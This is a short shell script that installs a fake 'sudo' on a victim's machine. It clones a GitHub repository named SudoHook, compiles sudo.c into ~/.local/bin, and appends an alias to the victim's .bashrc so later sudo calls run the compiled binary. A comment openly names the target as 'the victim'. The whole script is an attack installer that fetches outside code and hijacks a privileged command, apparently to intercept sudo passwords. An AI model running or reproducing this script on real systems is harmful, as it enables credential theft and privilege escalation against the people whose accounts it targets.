TEMPDIR=$(mktemp -d /tmp/sudo.XXXXXXX)
SHELLCFG="$HOME/.bashrc" # change based of the victim's shell
cd $TEMPDIR
git clone https://github.com/plasma-bls/SudoHook.git # assuming git is installed
cd SudoHook/
if [ ! -d "$HOME/.local/bin" ]; then mkdir $HOME/.local/bin; fi
gcc sudo.c -o sudo && chmod +x sudo && mv sudo $HOME/.local/bin/ # assuming gcc is installed
echo "alias sudo='$HOME/.local/bin/sudo'" >> $SHELLCFG
